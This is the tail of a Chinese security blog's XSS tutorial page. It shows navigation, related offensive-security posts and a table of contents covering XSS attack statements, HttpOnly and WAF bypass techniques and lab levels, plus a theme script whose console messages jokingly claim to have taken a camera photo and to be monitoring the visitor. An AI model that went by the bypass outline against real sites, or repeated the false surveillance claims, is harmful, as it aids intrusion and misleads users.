class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=XSS&amp;url=https://frankcao3.github.io/posts/[object%20Object]/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/4.%20XSS/undefined&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="rm.copyPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>渗透测试<span class="tagsPageCount">15</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/%5Bobject%20Object%5D/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/5.CSRF%E3%80%81SSRF/undefined"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">CSRF、SSRF</div></div></a></div><div class="next-post pull-right"><a href="/posts/%5Bobject%20Object%5D/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/3.%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/undefined"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">文件上传</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/posts/%5Bobject%20Object%5D/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/2.%20SQL%E6%B3%A8%E5%85%A5-WAF%E7%BB%95%E8%BF%87/undefined" title="SQL注入-WAF绕过"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2022-08-05</div><div class="title">SQL注入-WAF绕过</div></div></a></div><div><a href="/posts/%5Bobject%20Object%5D/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/4.%20CRLF%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%8F%8D%E5%BC%B9%E5%9E%8BXSS%EF%BC%89/undefined" title="CRLF注入漏洞（反弹型XSS）"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2022-08-05</div><div class="title">CRLF注入漏洞（反弹型XSS）</div></div></a></div><div><a href="/posts/%5Bobject%20Object%5D/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/6.%20RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/undefined" title="RCE代码及命令执行"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2022-08-05</div><div class="title">RCE代码及命令执行</div></div></a></div><div><a href="/posts/%5Bobject%20Object%5D/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/8.%20%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/undefined" title="文件下载"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2022-08-05</div><div class="title">文件下载</div></div></a></div><div><a href="/posts/%5Bobject%20Object%5D/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/10.%20XXE%E6%BC%8F%E6%B4%9E/undefined" title="XXE"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2022-08-05</div><div class="title">XXE</div></div></a></div><div><a href="/posts/%5Bobject%20Object%5D/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/11.%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/undefined" title="反序列化漏洞"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2022-08-05</div><div class="title">反序列化漏洞</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__description"></div></div></div><div class="card-widget anzhiyu-right-widget" id="card-wechat" onclick="null"><div id="flip-wrapper"><div id="flip-content"><div class="face" style="background: url(https://bu.dusays.com/2023/01/13/63c02edf44033.png) center center / 100% no-repeat"></div><div class="back face" style="background: url(https://bu.dusays.com/2023/05/13/645fa415e8694.png) center center / 100% no-repeat"></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS"><span class="toc-number">1.</span> <span class="toc-text">XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-number">1.1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%B1%E5%AE%B3"><span class="toc-number">1.2.</span> <span class="toc-text">危害</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E6%94%BB%E5%87%BB%E8%AF%AD%E5%8F%A5"><span class="toc-number">1.3.</span> <span class="toc-text">常用攻击语句</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E7%B1%BB"><span class="toc-number">1.4.</span> <span class="toc-text">分类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9%E5%9E%8B-XSS%EF%BC%88%E9%9D%9E%E6%8C%81%E7%BB%AD%E5%9E%8B%EF%BC%89"><span class="toc-number">1.4.1.</span> <span class="toc-text">反弹型 XSS（非持续型）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8B-XSS%EF%BC%88%E6%8C%81%E7%BB%AD%E5%9E%8B%EF%BC%89"><span class="toc-number">1.4.2.</span> <span class="toc-text">存储型 XSS（持续型）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DOM-%E5%9E%8B-XSS%EF%BC%88DOM%EF%BC%89"><span class="toc-number">1.4.3.</span> <span class="toc-text">DOM 型 XSS（DOM）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E6%94%BB%E5%87%BB%E8%BF%87%E7%A8%8B"><span class="toc-number">1.5.</span> <span class="toc-text">XSS攻击过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E8%87%AA%E5%8A%A8%E5%8C%96%E5%B7%A5%E5%85%B7"><span class="toc-number">1.6.</span> <span class="toc-text">XSS自动化工具</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E9%98%B2%E6%8A%A4%E5%BB%BA%E8%AE%AE"><span class="toc-number">1.7.</span> <span class="toc-text">XSS防护建议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HttpOnly%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number">1.8.</span> <span class="toc-text">HttpOnly的绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84WAF%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF"><span class="toc-number">1.9.</span> <span class="toc-text">常规WAF绕过思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%91%E5%90%8D%E5%8D%95%EF%BC%88%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-number">1.9.1.</span> <span class="toc-text">黑名单（大小写绕过）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A0%E9%99%A4%E9%BB%91%E5%90%8D%E5%8D%95%E5%AD%97%E6%AE%B5%EF%BC%88%E9%87%8D%E5%A4%8D%E6%95%B0%E6%8D%AE%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-number">1.9.2.</span> <span class="toc-text">删除黑名单字段（重复数据绕过）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E7%AC%A6%E5%8F%B7%E5%B9%B2%E6%89%B0"><span class="toc-number">1.9.3.</span> <span class="toc-text">特殊符号干扰</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%87%E7%AD%BE%E8%AF%AD%E6%B3%95%E6%9B%BF%E6%8D%A2"><span class="toc-number">1.9.4.</span> <span class="toc-text">标签语法替换</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87"><span class="toc-number">1.9.5.</span> <span class="toc-text">字符长度限制绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E4%BA%A4%E6%96%B9%E5%BC%8F%E6%9B%B4%E6%94%B9"><span class="toc-number">1.9.6.</span> <span class="toc-text">提交方式更改</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE%E6%BA%A2%E5%87%BA"><span class="toc-number">1.9.7.</span> <span class="toc-text">垃圾数据溢出</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E8%BD%AC%E6%8D%A2%EF%BC%88%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-number">1.9.8.</span> <span class="toc-text">编码转换（编码绕过）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0%E8%BD%AC%E4%B9%89%EF%BC%88%E9%9A%BE%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-number">1.9.9.</span> <span class="toc-text">内置函数转义（难绕过）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C"><span class="toc-number">1.10.</span> <span class="toc-text">实验</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#level-1"><span class="toc-number">1.10.1.</span> <span class="toc-text">level 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-2"><span class="toc-number">1.10.2.</span> <span class="toc-text">level 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-3"><span class="toc-number">1.10.3.</span> <span class="toc-text">level 3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-4"><span class="toc-number">1.10.4.</span> <span class="toc-text">level 4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-5"><span class="toc-number">1.10.5.</span> <span class="toc-text">level 5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-6"><span class="toc-number">1.10.6.</span> <span class="toc-text">level 6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-7"><span class="toc-number">1.10.7.</span> <span class="toc-text">level 7</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-8"><span class="toc-number">1.10.8.</span> <span class="toc-text">level 8</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-9"><span class="toc-number">1.10.9.</span> <span class="toc-text">level 9</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-10"><span class="toc-number">1.10.10.</span> <span class="toc-text">level 10</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-11"><span class="toc-number">1.10.11.</span> <span class="toc-text">level 11</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-12"><span class="toc-number">1.10.12.</span> <span class="toc-text">level 12</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-13"><span class="toc-number">1.10.13.</span> <span class="toc-text">level 13</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-14"><span class="toc-number">1.10.14.</span> <span class="toc-text">level 14</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-15"><span class="toc-number">1.10.15.</span> <span class="toc-text">level 15</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-16"><span class="toc-number">1.10.16.</span> <span class="toc-text">level 16</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-17-20"><span class="toc-number">1.10.17.</span> <span class="toc-text">level 17-20</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/%5Bobject%20Object%5D/hello-world/undefined" title="Hello World">Hello World</a><time datetime="2023-10-05T11:40:46.695Z" title="Created 2023-10-05 19:40:46">2023-10-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/%5Bobject%20Object%5D/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/2.%20SQL%E6%B3%A8%E5%85%A5-WAF%E7%BB%95%E8%BF%87/undefined" title="SQL注入-WAF绕过">SQL注入-WAF绕过</a><time datetime="2022-08-04T16:00:00.000Z" title="Created 2022-08-05 00:00:00">2022-08-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/%5Bobject%20Object%5D/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/4.%20CRLF%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%8F%8D%E5%BC%B9%E5%9E%8BXSS%EF%BC%89/undefined" title="CRLF注入漏洞（反弹型XSS）">CRLF注入漏洞（反弹型XSS）</a><time datetime="2022-08-04T16:00:00.000Z" title="Created 2022-08-05 00:00:00">2022-08-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/%5Bobject%20Object%5D/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/6.%20RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/undefined" title="RCE代码及命令执行">RCE代码及命令执行</a><time datetime="2022-08-04T16:00:00.000Z" title="Created 2022-08-05 00:00:00">2022-08-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/%5Bobject%20Object%5D/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/8.%20%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/undefined" title="文件下载">文件下载</a><time datetime="2022-08-04T16:00:00.000Z" title="Created 2022-08-05 00:00:00">2022-08-05</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2023 By <a class="footer-bar-link" href="/" title="ccb" target="_blank">ccb</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">Articles</div><div class="length-num">41</div></a><a href="/tags/" title="tag"><div class="headline">Tags</div><div class="length-num">6</div></a><a href="/categories/" title="category"><div class="headline">Categories</div><div class="length-num">0</div></a></div><span class="sidebar-menu-item-title">Function</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="Display Mode"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>Display Mode</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/DVWA%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">DVWA靶场<sup>10</sup></a><a href="/tags/%E5%AE%9E%E8%AE%AD-%E7%BD%91%E7%BB%9C%E5%BB%BA%E8%AE%BE%E9%83%A8%E5%88%86/" style="font-size: 0.88rem;">实训-网络建设部分<sup>7</sup></a><a href="/tags/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/" style="font-size: 0.88rem;">搭建博客<sup>1</sup></a><a href="/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/" style="font-size: 0.88rem;">机器学习<sup>1</sup></a><a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 0.88rem;">渗透测试<sup>15</sup></a><a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/" style="font-size: 0.88rem;">计算机基础<sup>5</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="Switch Between Traditional Chinese And Simplified Chinese">繁</button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random"></meting-js></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.20/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.4/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
+var HoldLog = console.log;
+console.log = function () {};
+let now1 = new Date();
+queueMicrotask(() => {
+  const Log = function () {
+    HoldLog.apply(console, arguments);
+  }; //在恢复前输出日志
+  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
+  now1.setTime(now1.getTime() + 250);
+  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
+  const dnum = Math.floor(days);
+  const ascll = [
+    `欢迎使用安知鱼!`,
+    `生活明朗, 万物可爱`,
+    `
+        
+       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
+      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
+      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
+      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
+      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
+      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
+        
+        `,
+    "已上线",
+    dnum,
+    "天",
+    "©2020 By 安知鱼 V1.6.8",
+  ];
+  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];
+
+  setTimeout(
+    Log.bind(
+      console,
+      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      ""
+    )
+  );
+  setTimeout(
+    Log.bind(
+      console,
+      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
+      "color:white; background-color:#4fd953",
+      "",
+      "",
+      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(
+      console,
+      "%c ⚡ Powered by 安知鱼 %c 你正在访问 ccb 的博客.",
+      "color:white; background-color:#f0ad4e",
+      ""
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
+  );
+});</script><script async src="/anzhiyu/random.js"></script><div class="js-pjax"><input type="hidden" name="page-type" id="page-type" value="post"></div><script>var visitorMail = "visitor@anheyu.com";
